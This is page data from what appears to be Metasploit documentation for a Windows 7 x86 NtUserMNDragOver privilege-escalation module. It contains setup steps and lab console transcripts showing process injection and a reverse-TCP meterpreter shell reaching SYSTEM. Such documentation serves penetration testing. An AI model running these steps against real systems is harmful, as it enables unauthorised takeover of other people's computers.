{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/local/ntusermndragover","result":{"data":{"moduleMetadataJson":{"id":"f01d6c13-f9a5-5794-ae65-6b9014c47a27","name":"Microsoft Windows NtUserMNDragOver Local Privilege Elevation","fullname":"exploit/windows/local/ntusermndragover","description":"This module exploits a NULL pointer dereference vulnerability in\n               MNGetpItemFromIndex(), which is reachable via a NtUserMNDragOver() system call.\n\n               The NULL pointer dereference occurs because the xxxMNFindWindowFromPoint()\n               function does not effectively check the validity of the tagPOPUPMENU\n               objects it processes before passing them on to MNGetpItemFromIndex(),\n               where the NULL pointer dereference will occur.\n\n               This module has been tested against Windows 7 x86 SP0 and SP1. Offsets\n               within the solution may need to be adjusted to work with other versions\n               of Windows, such as Windows Server 2008.","rank":300,"fields":{"detailsSlug":"/modules/details/exploit/windows/local/ntusermndragover","documentationSlug":"/modules/documentation/exploit/windows/local/ntusermndragover","referencesSlug":"/modules/references/exploit/windows/local/ntusermndragover"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits a NULL pointer dereference vulnerability in\nMNGetpItemFromIndex(), which is reachable via a NtUserMNDragOver() system\ncall.</p>\n<p>The NULL pointer dereference occurs because the xxxMNFindWindowFromPoint()\nfunction does not effectively check the validity of the tagPOPUPMENU\nobjects it processes before passing them on to MNGetpItemFromIndex(),\nwhere the NULL pointer dereference will occur.</p>\n<p>This module has been tested against Windows 7 x86 SP0 and SP1.\nOffsets within the solution may need to be adjusted to work with\nother versions of Windows, such as Windows Server 2008.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Get a non-SYSTEM meterpreter session on Windows 7 x86</li>\n<li><code class=\"language-text\">use exploit/windows/local/ntusermndragover</code></li>\n<li><code class=\"language-text\">set session &lt;session&gt;</code></li>\n<li><code class=\"language-text\">set payload windows/meterpreter/reverse_tcp</code></li>\n<li><code class=\"language-text\">set LHOST &lt;LHOST&gt;</code></li>\n<li><code class=\"language-text\">set LPORT 5555</code></li>\n<li><code class=\"language-text\">exploit</code></li>\n<li>Get a SYSTEM session</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"windows-7-sp0-x86\" style=\"position:relative;\"><a href=\"#windows-7-sp0-x86\" aria-label=\"windows 7 sp0 x86 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows 7 SP0 x86</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(multi/handler) &gt; sessions\n\nActive sessions\n===============\n\n  Id  Name  Type                     Information             Connection\n  --  ----  ----                     -----------             ----------\n  1         meterpreter x86/windows  User-PC\\User @ USER-PC  192.168.56.1:4444 -&gt; 192.168.56.15:49158 (192.168.56.15)\n\nmsf5 exploit(multi/handler) &gt; use exploit/windows/local/ntusermndragover\nmsf5 exploit(windows/local/ntusermndragover) &gt; set session 1\nsession =&gt; 1\nmsf5 exploit(windows/local/ntusermndragover) &gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nmsf5 exploit(windows/local/ntusermndragover) &gt; set LHOST 192.168.56.1\nLHOST =&gt; 192.168.56.1\nmsf5 exploit(windows/local/ntusermndragover) &gt; set LPORT 5555\nLPORT =&gt; 5555\nmsf5 exploit(windows/local/ntusermndragover) &gt; run\n\n[*] Started reverse TCP handler on 192.168.56.1:5555\n[*] Executing automatic check (disable AutoCheck to override)\n[+] The target appears to be vulnerable.\n[*] Launching notepad.exe to host the exploit...\n[+] Process 3464 launched.\n[*] Injecting exploit into 3464 ...\n[*] Exploit injected. Injecting payload into 3464...\n[*] Payload injected. Executing exploit...\n[*] Sending stage (176195 bytes) to 192.168.56.15\n[*] Meterpreter session 2 opened (192.168.56.1:5555 -&gt; 192.168.56.15:49159) at 2020-04-29 17:14:46 +0800\n\nmeterpreter &gt; sysinfo\nComputer        : USER-PC\nOS              : Windows 7 (6.1 Build 7600).\nArchitecture    : x86\nSystem Language : en_GB\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/windows\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"windows-7-sp1-x86\" style=\"position:relative;\"><a href=\"#windows-7-sp1-x86\" aria-label=\"windows 7 sp1 x86 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows 7 SP1 x86</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(multi/handler) &gt; sessions\n\nActive sessions\n===============\n\n  Id  Name  Type                     Information             Connection\n  --  ----  ----                     -----------             ----------\n  1         meterpreter x86/windows  User-PC\\User @ USER-PC  192.168.56.1:4444 -&gt; 192.168.56.5:49157 (192.168.56.5)\n\nmsf5 exploit(multi/handler) &gt; use exploit/windows/local/ntusermndragover\nmsf5 exploit(windows/local/ntusermndragover) &gt; set session 1\nsession =&gt; 1\nmsf5 exploit(windows/local/ntusermndragover) &gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nmsf5 exploit(windows/local/ntusermndragover) &gt; set LHOST 192.168.56.1\nLHOST =&gt; 192.168.56.1\nmsf5 exploit(windows/local/ntusermndragover) &gt; set LPORT 5555\nLPORT =&gt; 5555\nmsf5 exploit(windows/local/ntusermndragover) &gt; run\n\n[*] Started reverse TCP handler on 192.168.56.1:5555\n[*] Executing automatic check (disable AutoCheck to override)\n[+] The target appears to be vulnerable.\n[*] Launching notepad.exe to host the exploit...\n[+] Process 2696 launched.\n[*] Injecting exploit into 2696 ...\n[*] Exploit injected. Injecting payload into 2696...\n[*] Payload injected. Executing exploit...\n[*] Sending stage (176195 bytes) to 192.168.56.5\n[*] Meterpreter session 2 opened (192.168.56.1:5555 -&gt; 192.168.56.5:49158) at 2020-04-29 17:18:00 +0800\n\nmeterpreter &gt; sysinfo\nComputer        : USER-PC\nOS              : Windows 7 (6.1 Build 7601, Service Pack 1).\nArchitecture    : x86\nSystem Language : en_GB\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/windows\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"f01d6c13-f9a5-5794-ae65-6b9014c47a27"}}}